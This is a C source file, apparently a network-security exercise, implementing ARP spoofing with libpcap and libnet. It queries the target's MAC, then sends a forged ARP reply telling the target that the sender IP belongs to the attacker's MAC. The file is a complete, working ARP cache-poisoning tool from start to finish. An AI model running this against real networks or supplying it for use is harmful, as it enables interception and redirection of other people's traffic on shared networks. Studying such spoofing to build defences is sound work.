#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cassert>

#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>

#ifdef DEBUG
#define ASSERT(cond, msg)\
if(!(cond)) {\
    fprintf(stderr, "Assertion failed: %s. file: %s. line: %d\n", (msg), __FILE__, __LINE__);\
    exit(1);\
}
#else
#define ASSERT(cond, msg)\
if(!(cond)) {\
    fprintf(stderr, "Error: %s\n", (msg));\
    exit(1);\
}
#endif

#define MAX_DUMP_LENGTH     100
#define MIN(a, b) (((a) < (b)) ? (a) : (b))

#define PROMISCUOUS         1
#define NONPROMISCUOUS       0

#define ETHER_BROADCAST_MAC "\xFF\xFF\xFF\xFF\xFF\xFF"
#define ARP_REQUEST_MAC     "\x00\x00\x00\x00\x00\x00"

struct arp_packet {
    struct libnet_ethernet_hdr ether;
    struct libnet_arp_hdr arp;
    uint8_t sender_mac[ETHER_ADDR_LEN];
    struct in_addr sender_ip;
    uint8_t target_mac[ETHER_ADDR_LEN];
    struct in_addr target_ip;
} __attribute__((packed));


void print_char(char c) {
    if(0x20 <= c && c < 0x7F)
        printf("%c", c);
    else {
        printf(".");
    }
}

void print_mac(const char *name, uint8_t *mac) {
    printf("%s = ", name);
    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
        if(i != ETHER_ADDR_LEN - 1)
            printf("%02x:", mac[i]);
        else
            printf("%02x", mac[i]);
    }
    printf("\n");
}
void print_ip(const char *name, struct in_addr ip) {
    printf("%s = %s\n", name, inet_ntoa(ip));
}
void dump_data(uint8_t *p, int32_t len) {
    int32_t _len = MIN(MAX_DUMP_LENGTH, len);
    int32_t idx = 0;
    while(idx < _len) {
        int tmp = MIN(_len - idx, 16);
        for(int i = idx; i < idx + tmp; i++) {
            printf("%02X ", p[i]);
        }
        for(int i = tmp; i < 16; i++) {
            printf("   ");
        }
        printf("    ");
        for(int i = idx; i < idx + tmp; i++) {
            print_char(p[i]);
        }
        printf("\n");
        idx += tmp;
    }
}

void get_attacker_info(uint8_t *mac, struct in_addr *ip, char *dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ASSERT(fd != -1, strerror(errno));

    strncpy(ifr.ifr_name, dev, IF_NAMESIZE);
    ASSERT(ioctl(fd, SIOCGIFHWADDR, &ifr) == 0, strerror(errno));
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);

    strncpy(ifr.ifr_name, dev, IF_NAMESIZE);
    ASSERT(ioctl(fd, SIOCGIFADDR, &ifr) == 0, strerror(errno));
    *ip = ((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr;

    close(fd);
}

void get_arp_packet(struct arp_packet *packet, uint8_t *sender_mac, struct in_addr sender_ip, 
                        uint8_t *target_mac, struct in_addr target_ip, bool is_request) {
    // Ether
    if(is_request)
        memcpy(packet->ether.ether_dhost, ETHER_BROADCAST_MAC, ETHER_ADDR_LEN);
    else
        memcpy(packet->ether.ether_dhost, target_mac, ETHER_ADDR_LEN);
    memcpy(packet->ether.ether_shost, sender_mac, ETHER_ADDR_LEN);
    packet->ether.ether_type = htons(ETHERTYPE_ARP);

    // ARP
    packet->arp.ar_hrd = htons(ARPHRD_ETHER);
    packet->arp.ar_pro = htons(ETHERTYPE_IP);
    packet->arp.ar_hln = ETHER_ADDR_LEN;
    packet->arp.ar_pln = sizeof(struct in_addr);
    if(is_request)
        packet->arp.ar_op = htons(ARPOP_REQUEST);
    else
        packet->arp.ar_op = htons(ARPOP_REPLY);
    memcpy(packet->sender_mac, sender_mac, ETHER_ADDR_LEN);
    packet->sender_ip = sender_ip;
    if(is_request)
        memcpy(packet->target_mac, ARP_REQUEST_MAC, ETHER_ADDR_LEN);
    else 
        memcpy(packet->target_mac, target_mac, ETHER_ADDR_LEN);
    packet->target_ip = target_ip;
}

bool parse_arp_packet(uint8_t *mac, uint8_t *packet, size_t packet_len, struct in_addr ip) {
    if(packet_len < sizeof(struct arp_packet))
        return false;
    struct arp_packet *arp_view = (struct arp_packet *) packet;
    if(arp_view->ether.ether_type != htons(ETHERTYPE_ARP))
        return false;
    if(arp_view->sender_ip.s_addr != ip.s_addr)
        return false;
    memcpy(mac, arp_view->sender_mac, ETHER_ADDR_LEN);
    return true;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("%s [Interface] [Sender IP] [Target IP]\n", argv[0]);
        printf("ex: %s wlan0 192.168.10.2 192.168.10.1\n", argv[0]);
        exit(1);
    }
    char *dev = argv[1];
    uint8_t attacker_mac[ETHER_ADDR_LEN];
    struct in_addr attacker_ip;
    
    // attacker info
    get_attacker_info(attacker_mac, &attacker_ip, dev);
    print_mac("attacker", attacker_mac);
    print_ip("attacker", attacker_ip);
    
    struct in_addr sender_ip, target_ip;
    ASSERT(inet_aton(argv[2], &sender_ip) != 0, "Not a valid sender ip");
    ASSERT(inet_aton(argv[3], &target_ip) != 0, "Not a valid target ip");
    print_ip("sender", sender_ip);
    print_ip("target", target_ip);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1000, errbuf);
    ASSERT(handle != NULL, errbuf);
    struct arp_packet test_packet;
    get_arp_packet(&test_packet, attacker_mac, attacker_ip, NULL, target_ip, true);
    ASSERT(pcap_sendpacket(handle, (const u_char *) &test_packet, sizeof(test_packet)) == 0, pcap_geterr(handle));
    uint8_t target_mac[ETHER_ADDR_LEN];

    while(true) {
        struct pcap_pkthdr *header;
        const uint8_t *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        ASSERT(res != -1, pcap_geterr(handle));
        ASSERT(res != -2, "No more packet to read from savefile");

        if(parse_arp_packet(target_mac, (uint8_t *)packet, header->caplen, target_ip))
            break;
    }
    print_mac("target", target_mac);
    struct arp_packet exploit_packet;
    get_arp_packet(&exploit_packet, attacker_mac, sender_ip, target_mac, target_ip, false);
    ASSERT(pcap_sendpacket(handle, (const u_char *) &exploit_packet, sizeof(test_packet)) == 0, pcap_geterr(handle));
    printf("successfully send arp packet\n");
    return 0;
}